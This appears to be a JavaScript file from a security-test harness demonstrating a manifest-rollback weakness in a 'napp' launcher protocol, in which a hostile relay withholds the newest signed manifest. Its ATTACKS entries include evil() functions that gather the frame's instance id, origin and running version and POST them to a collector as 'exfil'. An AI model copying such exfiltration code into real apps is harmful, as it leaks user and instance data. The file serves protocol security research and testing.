// evil-09 — manifest rollback (tier 3, protocol). The fetch-side half of
// GAP-08: NAPP.md's entire publication story is "a napp is an app published
// as kind 35130" + "the launcher serves published files through a service
// worker" — no selection rule, no verification, no pinning. The reference's
// practice (validated from source, src/nsite/fetch.ts): an author-bound REQ
// to untrusted relays, newest created_at wins, files fetched by sha256 from
// the manifest's path tags. A relay withholding the newest manifest serves
// a valid, signed, older one — and the launcher installs it. No forgery, no
// exploit: rollback is a property of trusting relays with manifest
// selection, which the protocol does and specifies no defense for.
//
// evil-08 showed the in-frame half (no content addressing — a swap is
// undetectable); this rung demonstrates the fetch half end-to-end through
// two mock relays (tests/_mockrelay.mjs) serving REAL BIP340-signed
// manifests (napps/evil-09-manifest-rollback/fixtures/, generated from this
// rung's own built bytes by tools/make-evil09-fixtures.mjs).
//
// The harness knob: "manifest source" = relay. relay-a is the author's
// write relay, hostile (ignores the REQ filter, like a relay may, serving
// everything it has); with the withhold knob it also withholds the newest
// manifest. relay-b is a well-behaved napp relay. The harness's faithful
// fetchManifest miniature binds by author (so the hostile clone — the
// NEWEST manifest of all, by another key — is dropped: id takeover held,
// the honest counterpoint) and takes newest-created_at-wins among the
// author's answers. Withholding the newest turns that into rollback.
/* manifest-version: evil09:v2 */
window.__EVIL_KIT__ = [
  {
    label: 'the rollback pair (real signed manifests)',
    note: 'Both fixtures are REAL kind 35130 events — BIP340-signed, id-verified (tests re-verify both). v1 is older and perfectly valid; that is the whole point: rollback needs no forgery. A relay withholding v2 makes the launcher choose v1.',
    data: {
      v1: 'created_at 1735689600 — older, signed by the real author, installable',
      v2: 'created_at 1735776000 — the newest; a hostile relay simply never serves it',
    },
  },
  {
    label: 'the hostile-relay clone (author binding holds — rollback still arms)',
    note: 'The attacker fixture is the NEWEST manifest of all under the same d tag, signed by a different key. The reference binds manifests by author (fetchManifest filters by pubkey), so id takeover is held — but the same binding does nothing about rollback: v1 and v2 are both by the real author.',
    data: {
      d: 'evil-09-manifest-rollback',
      'v1 + v2': 'the real author — binding can\'t tell "rolled back" from "current"',
      'attacker-v3': 'another key, newest of all — dropped by author binding',
    },
  },
];

const NEWEST = 'v2';
async function fetchText(url) {
  try { return await fetch(url).then(r => r.text()); } catch (e) { return null; }
}
function runningVersion(html) {
  const m = /manifest-version:\s*evil09:(\S+)/.exec(html || '');
  return m ? m[1] : null;
}

const ATTACKS = [
  {
    id: 'rollback-bytes',
    name: 'manifest rollback',
    target: 'kind 35130 selection — newest-created_at-wins from untrusted relays; NAPP.md specifies no selection, no verification, no pinning',
    severity: 'critical',
    harm: 'A napp is whatever its manifest says, fetched anew every launch. The protocol hands manifest selection to relays and binds nothing: a relay (or any component between the manifest and the frame) that withholds the newest version makes the launcher install an older, valid, signed one. Yesterday\'s user approval covers today\'s rolled-back bytes.',
    evilBrief: 'Reads which manifest\'s bytes are actually running and POSTs the rollback evidence to the collector.',
    async demo() {
      const html = await fetchText('/index.html');
      if (html == null) return na('cannot fetch my own index.html here');
      const running = runningVersion(html);
      if (!running) return na('no version marker in my bytes — rebuilt without the fixture chain?');
      if (running === NEWEST) {
        return blocked('running ' + running + ' — the newest manifest\'s bytes. Held only because no relay withheld it this time: nothing VERIFIED this, and the protocol has no rule that would. Arm the harness\'s relay-withhold knob and reload to watch a hostile relay choose my bytes');
      }
      if (running === 'v1') {
        return armed('ROLLBACK PROVEN: I am v1 — an older, valid, BIP340-signed manifest the launcher chose because a relay withheld v2. Every byte of me is "legitimate": signed by the real author, sha-verified on fetch, selected by the protocol\'s own newest-wins rule. Withholding is indistinguishable from "this is all there is"');
      }
      return armed('running ' + running + ' — not the newest manifest (' + NEWEST + '). Whatever installed me, the protocol neither knows nor checks');
    },
    async evil() {
      const html = await fetchText('/index.html') || '';
      const running = runningVersion(html) || 'unknown';
      const out = {
        running, newest: NEWEST, rolled_back: running !== NEWEST,
        instance: safeGet(() => window.name), origin: safeGet(() => window.origin),
        note: 'manifest selection is newest-wins from untrusted relays; withholding the newest serves the older one',
      };
      out.exfil = await sendToCollector('rollback-evidence', out);
      return out;
    },
  },
  {
    id: 'no-pin',
    name: 'no content addressing anywhere',
    target: 'my install record pins no manifest hash — NAPP.md binds no content address to any fetch',
    severity: 'critical',
    harm: 'evil-08\'s byte-swap row showed a swap is undetectable in-frame; this row shows the install side: the identity the protocol gives a napp (window.name instance id, its origin) pins nothing. The user approved a NAME (the d tag); the protocol never binds that name to the bytes that run — not at install, not at launch, not across sessions.',
    evilBrief: 'Nothing to execute — this row is the honest observation; the exfil sends it as a reminder.',
    async demo() {
      const identity = { instance: safeGet(() => window.name) || '(none)', origin: safeGet(() => window.origin) };
      return na('nothing to detect in-frame: my install record is ' + JSON.stringify(identity) + ' — no manifest hash, no content address, nothing to compare against. The launcher knows me by d tag and instance id; the bytes those point at are whatever relays served last');
    },
    async evil() {
      return { exfil: await sendToCollector('no-pin-reminder', { note: 'NAPP.md binds no content address to any fetch' }) };
    },
  },
];
